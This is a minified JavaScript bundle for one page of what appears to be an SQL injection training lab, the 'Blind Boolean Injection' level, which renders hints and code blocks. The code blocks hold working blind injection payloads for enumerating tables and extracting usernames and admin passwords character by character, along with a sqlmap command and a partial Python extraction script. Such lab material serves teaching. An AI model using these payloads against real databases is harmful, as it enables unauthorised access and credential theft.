(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[11],{6351:function(e,s,n){Promise.resolve().then(n.bind(n,7398))},7398:function(e,s,n){"use strict";n.r(s),n.d(s,{default:function(){return t}});var r=n(7437),a=n(229);function t(){let e=async e=>{try{let s=await fetch("/api/level4",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)});return await s.json()}catch(e){return{success:!1,error:"Failed to connect to server"}}};return(0,r.jsx)("div",{className:"min-h-screen bg-gradient-to-br from-cyber-dark via-gray-900 to-cyber-dark py-12",children:(0,r.jsxs)("div",{className:"container mx-auto px-6",children:[(0,r.jsx)(a.Z,{level:4,title:"Blind Boolean Injection",description:"This level simulates a blind SQL injection scenario where you can only infer information based on the application's true/false responses. No direct database output is shown, making data extraction more challenging.",onSubmit:e,hints:["This level doesn't show database errors or results directly","Look for differences in application behavior (true/false responses)","Try: ' AND (SELECT COUNT(*) FROM users) > 0--","Use substring functions to extract data character by character","Example: ' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a'--"],isVulnerable:!0}),(0,r.jsx)("div",{className:"mt-12 max-w-4xl mx-auto",children:(0,r.jsxs)("div",{className:"vulnerability-card rounded-lg p-8",children:[(0,r.jsx)("h2",{className:"text-2xl font-semibold mb-6 text-cyber-blue",children:"\uD83D\uDD0D Technical Details"}),(0,r.jsxs)("div",{className:"space-y-6",children:[(0,r.jsxs)("div",{children:[(0,r.jsx)("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Blind Injection Techniques:"}),(0,r.jsx)("div",{className:"code-block",children:"-- Test if injection point exists\n' AND 1=1--        (should return normal response)\n' AND 1=2--        (should return different response)\n\n-- Enumerate database structure\n' AND (SELECT COUNT(*) FROM users) > 0--\n' AND (SELECT COUNT(*) FROM users) > 5--\n' AND (SELECT COUNT(*) FROM users) > 10--\n\n-- Extract data character by character\n' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a'--\n' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'b'--\n' AND (SELECT SUBSTRING(username,2,1) FROM users LIMIT 1) = 'a'--"})]}),(0,r.jsxs)("div",{children:[(0,r.jsx)("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Response Analysis:"}),(0,r.jsxs)("ul",{className:"space-y-2 text-gray-300",children:[(0,r.jsxs)("li",{className:"flex items-start",children:[(0,r.jsx)("span",{className:"text-cyber-blue mr-2",children:"•"}),'True condition: "Login failed" or normal response']}),(0,r.jsxs)("li",{className:"flex items-start",children:[(0,r.jsx)("span",{className:"text-cyber-blue mr-2",children:"•"}),"False condition: Different error or response pattern"]}),(0,r.jsxs)("li",{className:"flex items-start",children:[(0,r.jsx)("span",{className:"text-cyber-blue mr-2",children:"•"}),"Response time differences may also indicate true/false"]}),(0,r.jsxs)("li",{className:"flex items-start",children:[(0,r.jsx)("span",{className:"text-cyber-blue mr-2",children:"•"}),"HTTP status codes might change based on query result"]})]})]}),(0,r.jsxs)("div",{children:[(0,r.jsx)("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Advanced Boolean Techniques:"}),(0,r.jsx)("div",{className:"code-block",children:"-- Binary search for efficiency\n' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 64--\n' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 96--\n\n-- Check table existence\n' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='admin_users') > 0--\n\n-- Version detection\n' AND (SELECT SUBSTRING(version(),1,8)) = 'PostgreS'--"})]}),(0,r.jsxs)("div",{children:[(0,r.jsx)("h3",{className:"text-lg font-semibold text-cyber-green mb-3",children:"Automation Tools:"}),(0,r.jsx)("div",{className:"code-block",children:'# SQLMap for automated blind injection\nsqlmap -u "http://target/api/level4" --data="username=test&password=test" --method=POST --technique=B\n\n# Custom Python script for boolean-based extraction\nimport requests\nimport string\n\ndef extract_data(position, table, column):\n    for char in string.printable:\n        payload = f"\' AND (SELECT SUBSTRING({column},{position},1) FROM {table} LIMIT 1) = \'{char}\'--"\n        # Send request and analyze response\n        \n# Burp Suite Intruder for character-by-character extraction'})]})]})]})})]})})}}},function(e){e.O(0,[229,971,117,744],function(){return e(e.s=6351)}),_N_E=e.O()}]);